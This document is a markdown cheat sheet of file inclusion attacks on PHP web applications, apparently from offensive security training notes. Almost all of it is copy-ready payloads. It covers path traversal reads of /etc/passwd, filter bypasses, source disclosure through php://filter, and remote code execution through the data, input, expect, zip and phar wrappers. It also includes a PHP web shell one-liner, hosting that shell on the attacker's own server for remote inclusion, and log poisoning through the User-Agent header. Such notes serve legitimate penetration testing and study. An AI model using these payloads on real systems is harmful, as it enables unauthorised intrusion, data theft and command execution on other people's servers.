#web #lfi #rfi #php #rce

# File Inclusion (LFI / RFI)

Related: [file-upload](file-upload.md) · [command-injection](command-injection.md) · [fuzzing](fuzzing.md) · [whitebox-cmdi](../CodeReview/whitebox-cmdi.md)

## Basic LFI
```
/index.php?language=../../../../etc/passwd
```
LFI with path traversal.

```
/index.php?language=./languages/../../../../etc/passwd
```
LFI through an approved-path prefix.

## Filter Bypasses
```
/index.php?language=....//....//....//....//etc/passwd
```
Bypass a non-recursive `../` filter.

```
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
Bypass filters with URL encoding.

```
/index.php?language=../../../../etc/passwd%00
```
Null-byte truncation of an appended extension (PHP < 5.3.4, obsolete).

```
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
Read PHP source via the base64 filter.

## RCE via PHP Wrappers
```
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id
```
RCE via the `data://` wrapper.

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```
RCE via the `php://input` wrapper.

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
RCE via the `expect://` wrapper.

## RFI
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
```
Host a remote web shell. See [file-transfers](../Tools/file-transfers.md).

```
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
Include the remote PHP shell.

## LFI + Upload (wrappers)
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
Craft a GIF-magic-byte PHP shell, then include it. See [file-upload](file-upload.md).

```
/index.php?language=zip://shell.zip%23shell.php&cmd=id
```
RCE via the `zip://` wrapper on an uploaded archive.

```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
RCE via the `phar://` wrapper.

## Log / Session Poisoning
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```
Poison a server log via the User-Agent.

```
/index.php?language=/var/log/apache2/access.log&cmd=id
```
Include the poisoned log for RCE.

## Fuzzing
```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
Fuzz for LFI payloads. See [ffuf](ffuf.md).

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
Fuzz for vulnerable parameters.
